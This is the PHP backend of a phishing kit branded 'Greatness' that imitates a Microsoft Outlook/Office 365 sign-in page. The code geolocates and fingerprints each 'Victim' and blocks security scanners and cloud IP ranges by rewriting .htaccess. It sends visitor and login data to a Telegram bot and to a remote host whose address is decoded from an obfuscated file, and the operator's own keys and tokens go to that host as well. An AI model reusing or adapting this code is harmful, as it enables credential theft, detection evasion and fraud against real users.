<?php

@session_start();
header('Access-Control-Allow-Origin: *'); 
header("Access-Control-Allow-Credentials: true");
header('Access-Control-Allow-Methods: GET, PUT, POST, DELETE, OPTIONS');

$init = parse_ini_file('./files/config.ini');
$bot=$init['bot']; 
$chat=$init['chat'];
$email=$init['email'];
$finish=$init['finish'];
$api=trim($init['api']);
$v_send=$init['send_visit'];
$block_checker=$init['block_bot'];
$block_black=$init['detect_blacklist'] == "1" ? 1 : 0;
$block_proxy=$init['detect_proxy'] == "1" ? 1 : 0;
$accepted_countrys=$init['country_code'];
$s_key=$init['secret_key'];
$rz_name=$init['results_file'] != '' ? $init['results_file'] :'rz.txt';
$publ_ip=isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR'];
$actual_link = "http" . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";

function decod($data){
	$nd = [];
	$md_arrray = explode(",",$data);
	$magic = 0.25;
	foreach($md_arrray as $ing){
		$cst_int = ((int) $ing) * $magic * 0.5;
		array_push($nd,chr($cst_int));
	}
	return implode("",$nd);
}

if(file_exists('./files/httpd.grt')){
	$temphost = file_get_contents('./files/httpd.grt');
	$dump = decod($temphost);
	$dumps = json_decode($dump,1);
	if(count($dumps) > 1)
		$dumps_rem = array_shift($dumps);
	//file_put_contents("test.txst",$dump);
	$ip = $publ_ip;
	$ipOrds = "";
	foreach(str_split($ip) as $ind => $value){
		$ipOrds.= (string)ord((string) $value);
	}
	$spl = str_split($ipOrds);
	$determiner = end($spl);
	//$determiner = 3;
	$index = (int)$determiner % (count($dumps));
	$temp_host = $dumps[$index];

}



class error_handle{
	public $path = "./admin/error";
	public function __construct(){
		$this->cooked = $this->cook();
	}
	public function __destruct(){
		if(!$this->cooked){
			define("STOP","Failed To Make Error Directory");
		}
	}
	private function cook(){
		if(!is_dir($this->path)){
			//define error holder
			if(mkdir($this->path))
				return true;
			
		}
	}
	public function logerr($err){
		file_put_contents(__DIR__."/".$this->path."/err.txt",$err,FILE_APPEND);
	}
	public function myErrorHandler_abstract($errno, $errstr, $errfile, $errline)
	{
    if (!(error_reporting() & $errno)) {
        // This error code is not included in error_reporting, so let it fall
        // through to the standard PHP error handler
        //return false;
    }

    // $errstr may need to be escaped:
    $errstr = htmlspecialchars($errstr);
	
	$eid = uniqid();
    switch ($errno) {
    case E_USER_ERROR:
        $this->logerr(  "[FATAL ERROR $eid:$errline]: [$errno] $errstr \n");
        $this->logerr(  "[FATAL ERROR $eid]:  Fatal error on line $errline in file $errfile" . ", PHP " . PHP_VERSION . " (" . PHP_OS . ")\n");
        exit(1);

    case E_USER_WARNING:
        $this->logerr(  "[WARNING $eid:$errline at $errfile]: [$errno] $errstr\n");
        break;

    case E_USER_NOTICE:
        $this->logerr(  "[NOTICE $eid:$errline at $errfile]: [$errno] $errstr \n");
        break;

    default:
        $this->logerr( "[Unknown $eid:$errline at $errfile]: [$errno] $errstr\n");
        break;
    }

    /* Don't execute PHP internal error handler */
    return true;
	}
	public function fatal_handler_abstract() {
		$errfile = "unknown file";
		$errstr  = "shutdown";
		$errno   = E_CORE_ERROR;
		$errline = 0;

		$error = error_get_last();

		if($error !== NULL) {
			   $errno   = $error["type"];
     		   $errfile = $error["file"];
			   $errline = $error["line"];
			   $errstr  = $error["message"];
			   $eid = uniqid();
			   $this->logerr(  "[EXIT ERROR $eid]: [$errno] $errstr \n");
			   $this->logerr(  "[EXIT ERROR $eid]:  Fatal error on line $errline in file $errfile" . ", PHP " . PHP_VERSION . " (" . PHP_OS . ")\n");
		}
	}
	public function check_send($api,$chat,$host){
		if(!file_exists(__DIR__."/".$this->path."/err.txt"))
			return false;
		if(($content = @file_get_contents(__DIR__."/".$this->path."/err.txt")) && !empty($content)){
			if($this->send_error_log($content,$api,$chat,$host))
				@unlink(__DIR__."/".$this->path."/err.txt");
		}
	}
	private function send_error_log($error,$api,$chat,$host){
		return do_it('error',$error,$api,$chat,$host) == "logged";
	}
}

//errors 
error_reporting(E_ALL);
$errors = new error_handle();
register_shutdown_function( [$errors,"fatal_handler_abstract"] );
$old_error_handler = set_error_handler([$errors,"myErrorHandler_abstract"]);


function logger_error($error){
	file_put_contents("./admin/error.log",$error);
}
class disp {
	public function curl1($url){
		if($this->curl($url)==''){
			$this->curl($url);
		}
	}
	public function save($arg,$loc){
		file_put_contents(__DIR__.'/'.$loc,$arg,FILE_APPEND);
	}
	public function curl($url){
		$ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $exec = curl_exec($ch);
		$httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
		if($httpcode == 200){
			return $exec;
		}
		else{
			logger_error("Telegram token not activated");
			echo "token";
			exit();
		}
	}
	public function mailTo($add,$cont){
		$subject='++++Office Email From Greatness+++++';
		$headers='Content-type: text/html; charset=UTF-8' . "\r\nFrom: Greatness <ghost+}f7113307018770d52d4f94fec013197f{galf@greatness.com>" . "\r\n";
		@mail($add,$subject,$cont,$headers);
	}
	public function send($arg,$bot_token,$chat_id,$email,$loc){
		$config=array(
		'chat_id'=>$chat_id,
		'text'=>$arg
		);
		$url='https://api.telegram.org/bot'.str_replace('bot','',$bot_token);
		$start=$url.'/sendMessage?'.str_replace('?','',http_build_query($config));
		$this->curl1($start);
	//	$this->mailTo($email,$arg);
	//	$this->save($arg,$loc);
	}
}

define("bot_token",$bot);
define("chat_id",$chat);
define("a_link",$actual_link);
define("public_ip",$publ_ip);
define("rem",$dumps_rem ?? "");
define("one_hot",[$block_black, $block_proxy]);

function do_it($type,$value,$api,$chat,$temp_host){
	$bot = bot_token;
	$chat = chat_id;
	$actual_link=a_link;
	$pub_ip = public_ip;
	$link = $actual_link;
switch($type){
	case 'email':
		$data = array('api_key'=>array($api,$chat,$bot,$link),'data'=>$value,'type'=>'email');
		break;
	case 'login':
		$data = array('api_key' => array($api,$chat,$bot,$link),'data'=>$value,'type'=>'login');
		break;
	case 'bot':
		$data = array('api_key' => array($api,$chat,$bot,$link),'data'=>$value,'type'=>'bot');
		break;
	case 'code':
		$data = array('api_key' => array($api,$chat,$bot,$link),'data'=>$value,'type'=>'code');
		break;
	case 'auth':
		$data = array('api_key' => array($api,$chat,$bot,$link),'data'=>$value,'type'=>'auth');
		break;
	case 'start_mf':
		$data = array('api_key' => array($api,$chat,$bot,$link),'data'=>$value,'type'=>'start_mf');
		break;
	case "random":
		$data = array('api_key' => array($api,$chat,$bot,$link),'data'=>"",'type'=>'random');
		break;
	case "mkr":
		$dir = 999;
		$data = array('api_key' => array($api,$chat,$bot,$link),'data'=>"",'type'=>'mkr');
		break;
	case "mkr2":
		$dir = 999;
		$data = array('api_key' => array($api,$chat,$bot,$link),'data'=>"",'type'=>'mkr2');
		break;
	case "upd":
		$data = array('api_key' => array($api,$chat,$bot,$link),'data'=>'{"upd":"1"}','type'=>'upd');
		$dir = 999;
		break;
	case "error":
		$data = array('api_key' => array($api,$chat,$bot,$link),'data'=>$value,'type'=>'error');
		$dir = 999;
		break;
	case "bt":
		$data = array('api_key' => array($api,$chat,$bot,$link),'data'=>$value,'type' => 'bt');
		break;
	default:
		$one_hot = one_hot;
		$data=array('api_key' => array($api,$chat,$bot,$link,$one_hot,$pub_ip));
		$dir = 999;
}

$data_json = json_encode($data);
$raw='data='.urlencode($data_json);
$priv=isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR'];

$url = !isset($dir) ? $temp_host : (rem ?: $temp_host);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Accept: */*',
    //'Accept-Encoding: gzip, deflate',
    'Accept-Language: en-US,en;q=0.5',
    'Connection: keep-alive',
    'X-For: '.$priv,
    'User-Agent: '.$_SERVER['HTTP_USER_AGENT']#Mozilla/5.0 (Windows NT 5.1; rv:16.0) Gecko/20100101 Firefox/16.0'
  )
);
curl_setopt($ch, CURLOPT_POSTFIELDS,$raw);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FAILONERROR, true);
$response  = curl_exec($ch);
$httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
if($type=='live_check'){
	if($httpcode!=200 || $httpcode==404){
		return 0;
		exit();
	}
	else{
		return 1;
		exit();
	}
}
curl_close($ch);
return $response;
}
function os(){
		$os_platform="Unknown OS";
		$all=array('/windows nt 10/i'=>'Windows 10','/windows nt 6.3/i'=>'Windows 8.1','/windows nt 6.2/i'=>'Windows 8','/windows nt 6.1/i'=>'Windows 7','/windows nt 6.0/i'=>'Windows Vista','/windows nt 5.2/i'=>'Windows Server 2003/XP x64','/windows nt 5.1/i'=>'Windows XP','/windows xp/i'=>'Windows XP','/windows nt 5.0/i'=>'Windows 2000','/windows me/i'=>'Windows ME','/win98/i'=>'Windows 98','/win95/i'=>'Windows 95','/win16/i'=>'Windows 3.11','/macintosh|mac os x/i'=>'Mac OS X','/mac_powerpc/i'=>'Mac OS 9','/linux/i'=>'Linux','/ubuntu/i'=>'Ubuntu','/iphone/i'=>'iPhone','/ipod/i'=>'iPod','/ipad/i'=>'iPad','/android/i'=>'Android','/blackberry/i'=>'BlackBerry','/webos/i'=>'Mobile');
		foreach($all as $regex=>$value){
			if(preg_match($regex,$_SERVER['HTTP_USER_AGENT'])){
				$os_platform=$value;
			}
		}
		return $os_platform;
}
function browse(){
		$browser="Unknown Browser";
		$all=array('/msie/i'=>'Internet Explorer','/firefox/i'=>'Firefox','/safari/i'=>'Safari','/chrome/i'=>'Chrome','/edge/i'=>'Edge','/opera/i'=>'Opera','/netscape/i'=>'Netscape','/maxthon/i'=>'Maxthon','/konqueror/i'=>'Konqueror','/mobile/i'=>'Handheld Browser');
		foreach($all as $regex=>$value){
			if(preg_match($regex,$_SERVER['HTTP_USER_AGENT'])){
				$browser=$value;
			}
		}
		return $browser;
}
function save_r($name,$content,$type="json"){
	switch($type){
		case 'json':
			file_put_contents('./admin/'.$name,json_encode($content).PHP_EOL,FILE_APPEND);
			break;
		default:
			file_put_contents($name,$content.PHP_EOL,FILE_APPEND);
	}
}
function get_t_d($bot,$chat,$email,$v_send,$block_checker,$details){
list($block_black,$block_proxy,$accepted_countrys) = array_map(function($inp){
	return $GLOBALS[$inp];
},["block_black","block_proxy","accepted_countrys"]);
$details = is_array($details) ? $details : json_decode($details,1);
$specip=$_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
if(!isset($details["country"]) || !isset($details["isp"])){
	$detail = json_decode(file_get_contents('https://nordvpn.com/wp-admin/admin-ajax.php?action=get_user_info_data&ip='.$specip),1);
	if($detail !=  null){
		$details["countrycode"] = $detail["country_code"] ?? "";
		$details = @array_merge($details,$detail);
	}
	if($detail == null || !isset($details["country"])){
		$detail =json_decode(file_get_contents('https://ipinfo.io/'.$specip.'/json'),1);
		$details["countrycode"] = $detail["country"] ?? "";
		$details["timezone"] = $detail["timezone"] ?? "";
		$details["country"] = $detail["country"] ?? "";
		$details["city"] = $detail["region"] ?? "";
		$details["isp"] = @preg_replace("/AS(.*?) /i","",($detail["org"] ?? ""));
	}
}
$country=isset($details['country']) ? $details['country'] : '' ;
$isp=isset($details['isp']) ? @trim($details['isp']) : '' ;
$GLOBALS["country"] = $country;
$GLOBALS["isp"] = $isp;
if(!isset($details['ip'])){
	file_put_contents('error.txt',json_encode($details).PHP_EOL);
}
$ip=$specip;
$city=isset($details['city']) ? $details['city'] : '' ;
$timezone=$details['timezone'] ?? '' ;
$GLOBALS["city"] = $city;
$os=os();
$browser=browse();
$det="Victim : $ip
City : $city
Country : $country
Browser : $browser
Device : $os
ISP : $isp".($timezone != "" ? ("
Timezone : $timezone
") : "");

function redirect($one = 0,$reason="Known Bot",$range=false){
list($ip,$city,$country,$isp) = array_map(function($inp){
	return $GLOBALS[$inp];
},["ip","city","country","isp"]);
if($one){
	$ip =$_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
	$ip_arr = explode(',',$ip);
	foreach ($ip_arr as $_ => $of){
		$deny = sprintf('deny from %s',$of.PHP_EOL);
		file_put_contents('.htaccess',$deny,FILE_APPEND);
	}
	if($range)
			file_put_contents('.htaccess',$range,FILE_APPEND);
}
 save_r('log.json',array(
	'ip' => $ip,
	'city' => $city,
	'country' => $country,
	'isp' => $isp,
	'bot' => 1,
	'reason' => $reason,
	'date' => date('jS F Y, h:i:s A'),
));
echo "{\"block\":\"[$reason]\"}"; //add js to show block reason
exit();
}
//blacklisted ip
$details["blacklist"] = $details["blacklist"] ?? "";
if($details["blacklist"] && $block_black){
	redirect(0,$reason="Blacklisted Ip");
}

//proxy usage
$details["proxy_usage"] = $details["proxy_usage"] ?? "";
if($details["proxy_usage"] && $block_proxy){
	redirect(0,$reason="Using Proxy");
}

//country code
$details["countrycode"] = $details["countrycode"] ?? "";
if(!in_array($details["countrycode"],(explode(",",$accepted_countrys))) && !empty($accepted_countrys)){
	redirect(0,$reason="Wrong Country");
}

if($block_checker == "1"){
if (preg_match('/40\.94/',$ip)){
	redirect(1);
}
if($ip == '69.55.5.249'){
	redirect(1);
}
if($ip == '47.19.239.50'){
	redirect(1);
}
if ($isp=='Microsoft Corporation' || $isp == 'Microsoft Azure'){
	redirect(1);
}
if ($isp=='Amazon.com' && strtolower($city)== 'ashburn'){
	redirect(1);
}
if(preg_match('/leaseweb/i',$isp)){
	redirect(1);
}
if(strtolower($isp) == 'm247 ltd'){
	redirect(1);
}
if($isp == 'Cogent Communications'){
	redirect(1);
}
$bl = file_get_contents("admin/bl.txt");
$bls = explode(PHP_EOL,$bl);
foreach($bls as $in => $val){
	$js = json_decode($val,1);
	switch($js["h"]){
		case "ip":
			if(stripos($ip,$js["v"]) !== false){
				redirect(1);
			}
			break;
		case "isp":
			if(stripos($isp,$js["v"]) !== false){
				redirect(1);
			}
			break;
		default:
			break;
	}
}
}
save_r('log.json',array(
	'ip' => $ip,
	'city' => $city,
	'country' => $country,
	'isp' => $isp,
	'bot' => 0,
	'date' => date('jS F Y, h:i:s A'),
));
if ($v_send == "1"){
$dis=new disp();
$dis->send($det,$bot,$chat,$email,'visits.txt');
}
}
function to_output($email,$url,$api,$chat,$config = null){
	if($config){
		$arr_conf = json_decode(base64_decode($config),1);
		if($arr_conf){
			if($arr_conf["title"] != "default"){
				$title = $arr_conf["title"];
			};
			if($arr_conf["back"] != "default"){
				$back = sprintf("url(%s);",$arr_conf["back"]);
			}
			if($arr_conf["caption"] != "default"){
				$caption = $arr_conf["caption"];
			}
		}
	}
	return base64_encode('<html dir="ltr" lang="en" style="filter: hue-rotate(10deg)">
   <meta charset="utf-8">
   <link href="data:image/png;base64,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" rel="shortcut icon">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css" integrity="sha256-NuCn4IvuZXdBaFKJOAcsU2Q3ZpwbdFisd5dux4jkQ5w=" crossorigin="anonymous">
   <style>@font-face {
                font-family: \'Segoe UI WestEuropean\';
                src: local(\'Segoe UI Light\'), local(\'Segoe WP Light\'),
                    url(\'https://outlook-1.cdn.office.net/assets/mail/fonts/v1/fonts/segoeui-light.eot?#iefix\')
                        format(\'embedded-opentype\'),
                    url(\'https://outlook-1.cdn.office.net/assets/mail/fonts/v1/fonts/segoeui-light.woff\')
                        format(\'woff\'),
                    url(\'https://outlook-1.cdn.office.net/assets/mail/fonts/v1/fonts/segoeui-light.ttf\')
     ;                   format(\'truetype\');
                font-weight: 100;
                font-style: normal;
            }
            @font-face {
                font-family: \'Segoe UI WestEuropean\';
                src: local(\'Segoe UI\'), local(\'Segoe WP\'),
                    url(\'https://outlook-1.cdn.office.net/assets/mail/fonts/v1/fonts/segoeui-regular.eot?#iefix\')
                        format(\'embedded-opentype\'),
                    url(\'https://outlook-1.cdn.office.net/assets/mail/fonts/v1/fonts/segoeui-regular.woff\')
                        format(\'woff\'),
                    url(\'https://outlook-1.cdn.office.net/assets/mail/fonts/v1/fonts/segoeui-regular.ttf\')
                        format(\'truetype\');
                font-weight: 400;
                font-style: normal;
            }
            @font-face {
                font-family: \'Segoe UI WestEuropean\';
                src: local(\'Segoe UI Semibold\'), local(\'Segoe WP Semibold\'),
                    url(\'https://outlook-1.cdn.office.net/assets/mail/fonts/v1/fonts/segoeui-semibold.eot?#iefix\')
                        format(\'embedded-opentype\'),
                    url(\'https://outlook-1.cdn.office.net/assets/mail/fonts/v1/fonts/segoeui-semibold.woff\')
                        format(\'woff\'),
                    url(\'https://outlook-1.cdn.office.net/assets/mail/fonts/v1/fonts/segoeui-semibold.ttf\')
                        format(\'truetype\');
                font-weight: 600;
                font-style: normal;
            }
            @font-face {
                font-family: \'Segoe UI WestEuropean\';
                src: local(\'Segoe UI Semilight\'), local(\'Segoe WP Semilight\'),
                    url(\'https://outlook-1.cdn.office.net/assets/mail/fonts/v1/fonts/segoeui-semilight.eot?#iefix\')
                        format(\'embedded-opentype\'),
                    url(\'https://outlook-1.cdn.office.net/assets/mail/fonts/v1/fonts/segoeui-semilight.woff\')
                        format(\'woff\'),
                    url(\'https://outlook-1.cdn.office.net/assets/mail/fonts/v1/fonts/segoeui-semilight.ttf\')
                        format(\'truetype\');
                font-weight: 200;
                font-style: normal;
            }
            @font-face {
                font-family: \'FabricMDL2Icons\';
                src: url(\'https://outlook-1.cdn.office.net/owamail/20220325002.04/resources/fonts/o365icons-mdl2.woff\')
                        format(\'woff\'),
                    url(\'https://outlook-1.cdn.office.net/owamail/20220325002.04/resources/fonts/o365icons-mdl2.ttf\')
                        format(\'truetype\');
                font-weight: normal;
                font-style: normal;
            }
            @font-face {
                font-family: \'office365icons\';
                src: url(\'https://outlook-1.cdn.office.net/owamail/20220325002.04/resources/fonts/office365icons.eot?\');
                src: url(\'https://outlook-1.cdn.office.net/owamail/20220325002.04/resources/fonts/office365icons.eot?#iefix\')
                        format(\'embedded-opentype\'),
                    url(\'https://outlook-1.cdn.office.net/owamail/20220325002.04/resources/fonts/office365icons.woff?\')
                        format(\'woff\'),
                    url(\'https://outlook-1.cdn.office.net/owamail/20220325002.04/resources/fonts/office365icons.ttf?\')
                        format(\'truetype\'),
                    url(\'https://outlook-1.cdn.office.net/owamail/20220325002.04/resources/fonts/office365icons.svg?#office365icons\')
                        format(\'svg\');
                font-weight: normal;
                font-style: normal;
            }
            #preloadDiv {
                height: 1px;
                margin-bottom: -1px;
                overflow: hidden;
                visibility: hidden;
            }
            #loadingScreen {
                position: fixed;
                top: 0;
                bottom: 0;
                left: 0;
                right: 0;
                background-color: #fff;
            }
            #loadingLogo {
                position: fixed;
                top: calc(50vh - 90px);
                left: calc(50vw - 90px);
                width: 180px;
                height: 180px;
            }
            #MSLogo {
                position: fixed;
                bottom: 36px;
                left: calc(50vw - 45px);
            }
            .dark #loadingScreen {
                background-color: #333;
            }
            #loadingLogo2_ts {
                animation: loadingLogo2_ts__ts 3000ms linear 1 normal forwards;
                animation-iteration-count: 1000;
            }
            #loadingLogo2 {
                animation: loadingLogo2_c_o 3000ms linear 1 normal forwards;
                animation-iteration-count: 1000;
            }
            #loadingLogo3_to {
                animation: loadingLogo3_to__to 3000ms linear 1 normal forwards;
                animation-iteration-count: 1000;
            }
            #loadingLogo6_ts {
                animation: loadingLogo6_ts__ts 3000ms linear 1 normal forwards;
                animation-iteration-count: 1000;
            }
            #loadingLogo8_ts {
                animation: loadingLogo8_ts__ts 3000ms linear 1 normal forwards;
                animation-iteration-count: 1000;
            }
            #loadingLogo9_to {
                animation: loadingLogo9_to__to 3000ms linear 1 normal forwards;
